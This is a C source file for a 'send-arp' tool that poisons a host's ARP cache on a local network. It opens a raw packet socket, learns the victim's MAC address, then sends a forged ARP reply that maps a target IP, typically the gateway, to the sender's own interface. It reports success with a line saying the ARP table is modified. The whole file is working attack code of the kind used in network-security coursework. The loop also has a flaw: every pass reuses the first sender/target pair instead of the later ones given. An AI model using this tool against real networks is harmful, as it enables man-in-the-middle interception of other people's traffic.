#include "send-arp.h"

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <stdio.h>
#include <string.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
	char buff[256];
	char interfaceName[IFNAMSIZ];
	struct in_addr sender_ip;
	struct in_addr target_ip;
	

    if (argc < 4){
        fprintf(stderr, "./send-arp <interface> <sender ip1> <target ip1> <sender ip2> <target ip2> ... \n");
        return 0;
    }
    
    int arg_index = 2;

    while(arg_index < argc)
    {
        char broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        memset(buff, 0, 256);
        
        inet_aton(argv[2], &sender_ip);
        inet_aton(argv[3], &target_ip);
        strncpy(interfaceName, argv[1], IFNAMSIZ);

        struct sockaddr_ll sk_addr;
        memset(&sk_addr, 0, sizeof(struct sockaddr_ll));

        int sockfd = -1;
        if((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0){
            perror("socket() failed!");
        }

        struct ifreq if_hwaddr;
        memset(&if_hwaddr,0,sizeof(struct ifreq));
        strncpy(if_hwaddr.ifr_name, interfaceName, IFNAMSIZ-1);
        ioctl(sockfd, SIOCGIFHWADDR, &if_hwaddr);

        struct arp_hdr arpRequest;
        unsigned char dst_mac[6] = {0,};

        unsigned long sip = get_ip(interfaceName,sockfd);

        arpRequest = buildArpPacket(interfaceName, sockfd, sender_ip, if_hwaddr,dst_mac,sip);

        char payload[ARPHDSIZE+strlen(buff)+1];
        char *arp = (char *)&arpRequest;
        memcpy(payload,arp,ARPHDSIZE);
        memcpy(&payload[ARPHDSIZE],buff,strlen(buff));
        send_packet(interfaceName, sk_addr, broadcast, payload, sockfd, 2, if_hwaddr, ARPHDSIZE+strlen(buff));

        unsigned char response[256];
        int arpReceived = 0;
        int sk_addr_size = sizeof(struct sockaddr_ll);
        while(!arpReceived){
            memset(&sk_addr, 0, sk_addr_size);
            int recvLen = recvfrom(sockfd, response, 256, 0 , (struct sockaddr*)&sk_addr, &sk_addr_size);
            if(response[12] == 0x08 && response[13] == 0x06 && response[20] == 0x00 && response[21] == 0x02){

                memcpy(dst_mac,&response[22],6);
                printf("Dst MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",dst_mac[0],dst_mac[1],dst_mac[2],dst_mac[3],dst_mac[4],dst_mac[5]);
                arpReceived = 1;
            }
        }

        struct in_addr tip;
        inet_aton(argv[3],&tip);
        arpRequest = buildArpPacket(interfaceName, sockfd, sender_ip, if_hwaddr,dst_mac,tip.s_addr);
        memcpy(payload,arp,ARPHDSIZE);
        memcpy(&payload[ARPHDSIZE],buff,strlen(buff));
        send_packet(interfaceName, sk_addr, broadcast, payload, sockfd, 2, if_hwaddr, ARPHDSIZE+strlen(buff));
        printf("%s's ARP Table is modified.\n", argv[arg_index]);
        arg_index += 2;

    }
	return 0;
}